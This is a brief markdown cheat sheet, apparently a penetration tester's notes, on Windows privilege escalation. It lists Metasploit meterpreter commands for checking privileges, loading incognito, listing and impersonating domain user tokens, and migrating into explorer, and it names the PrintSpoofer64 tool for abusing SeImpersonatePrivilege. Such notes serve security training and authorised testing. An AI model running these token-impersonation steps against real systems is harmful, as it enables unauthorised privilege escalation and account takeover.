### msfconsole
after access to system, check getprivs and find SeImpersonatePrivilege, load incognito
```bash
getprivs
load incognito
list_tokens -u
impersonate_token "[Domain]\[User]"
migrate [explorer]
```

```cmd
whoami /priv
```
PrintSpoofer64.exe